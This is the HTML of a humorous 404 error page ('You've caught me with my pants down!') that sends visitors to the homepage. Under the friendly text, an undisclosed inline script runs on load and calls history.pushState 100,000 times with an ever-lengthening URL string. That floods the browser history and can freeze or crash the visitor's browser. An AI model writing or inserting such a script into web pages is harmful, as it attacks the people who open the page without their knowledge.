<main>
  <section class="quickabout">
    <p><strong>You've caught me with my pants down!</strong></p>
    <p>Well, this is embarrasing. I can't find the page you asked for. Bad Link? Mistyped Address?</p>
    <p>Your best bet is to go over to the <a href="/">homepage</a></p>
    <p>Now if you just turn around for a second, i'll be putting my pants back on.</p>
  </section>
  <script>
      var total = "";
      for( var i = 0; i < 100000; i++ ) {
          total = total + i.toString();
          history.pushState(0,0, total );
      }
  </script>
</main>